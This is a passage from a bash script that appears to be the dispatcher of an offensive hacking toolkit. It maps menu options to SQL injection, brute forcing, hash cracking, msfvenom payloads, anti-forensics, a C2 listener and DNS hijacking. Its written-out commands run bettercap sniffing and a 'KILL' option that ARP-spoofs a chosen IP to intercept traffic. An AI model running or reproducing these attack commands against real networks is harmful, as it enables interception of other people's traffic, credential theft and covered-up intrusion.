    FUZZ) web_fuzz "$TARGET" ;;
    WPSCAN) wp_audit "$TARGET" ;;
    RUSTSCAN) rust_scan "$TARGET" ;;
    SUBFINDER) sub_discover "$TARGET" ;;
    SQLMAP) sql_inject "$TARGET" ;;
    BREACH) breach_search "$TARGET" ;;
    TAKEOVER) takeover_check "$TARGET" ;;
    ORIGIN) origin_find "$TARGET" ;;
    EMPLOYEES) employee_recon "$TARGET" ;;
    SUPPLY) supply_audit "$TARGET" ;;
    DORKS) github_dork "$TARGET" ;;
    SECRETS_DEEP) api_deep_extract "$TARGET" ;;
    INTERNAL) internal_enum "$TARGET" ;;
    DIRECT) direct_link_disco ;;
    SHARES) share_hunter "$TARGET" ;;
    WPAD) wpad_audit ;;
    PROTOCOL) protocol_audit ;;
    VLAN) vlan_hop_recon ;;
    SNMP) snmp_map "$TARGET" ;;
    BRUTE) hydra_brute "$TARGET" ;;
    CRACK) hash_crack "$TARGET" ;;
    PAYLOAD) msf_venom "$TARGET" ;;
    SHODAN) api_intel "$TARGET" ;;
    YARA) yara_scan "$TARGET" ;;
    HONEYPOT) honeypot_trap "$TARGET" ;;
    ANTI_FORENSICS) anti_forensics ;;
    C2_LISTENER) c2_listener ;;
    DNS_HIJACK) dns_hijack ;;
    CLOUD) cloud_recon "$TARGET" ;;
    FILE) exiftool "$TARGET" | grep -v "Directory" ;;
    NET)
        INTERFACE=$(ip route get 8.8.8.8 | awk '{print $5; exit}')
        sudo arp-scan --interface=$INTERFACE --localnet --retry=5 --ignoredups ;;
    SNIFF) sudo bettercap -eval "net.probe on; net.sniff on" ;;
    KILL) echo -ne "Target IP: "; read t; sudo bettercap -eval "set arp.spoof.targets $t; arp.spoof on; net.sniff on" ;;
    MAC) ghost_mode ;;
esac

echo -e "\n${NEON_BLUE}========================================================${RESET}"
